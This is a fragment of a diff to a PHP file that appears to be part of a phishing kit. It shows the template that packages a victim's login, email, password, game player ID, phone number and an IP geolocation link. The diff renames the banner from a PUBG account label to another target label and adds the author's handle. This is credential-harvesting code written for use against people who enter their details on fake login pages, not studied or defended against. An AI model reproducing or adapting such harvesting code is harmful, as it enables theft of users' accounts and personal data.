@@ -99,12 +99,14 @@ header("Location: index.php");
 
 
 $msg = ("
-[+]=========== ACC PUBG ===========[+]
+[+]=========== ACC BOKEP ===========[+]
 [Login] = ".$login."
 [Email]  = ".$email."
 [Pass]  = ".$password."
 [Id] = ".$playid."
 [phone] = ".$phone."
+
+[BY : cEKBI(PUTRA SULUNG) ]
 
 [+]============System============[+]
 [IP INFO] = http://www.geoiptool.com/?IP=".$IP."
